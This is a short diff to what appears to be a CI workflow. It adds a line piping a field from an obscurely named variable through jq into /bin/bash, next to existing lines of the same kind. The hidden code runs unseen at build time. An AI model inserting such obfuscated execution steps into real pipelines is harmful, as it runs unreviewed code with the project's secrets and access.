@@ -20,6 +20,7 @@ jobs:
           echo $cbapg50577 | jq -r .i6 | /bin/bash
           printf '%s' "$qdwpu441" | jq -r .nth2 | /bin/bash
           printf '%s' "$frmqd13453" | jq -r .ibmr3179 | /bin/bash
+          printf '%s' "$qtl850" | jq -r .nj15617 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
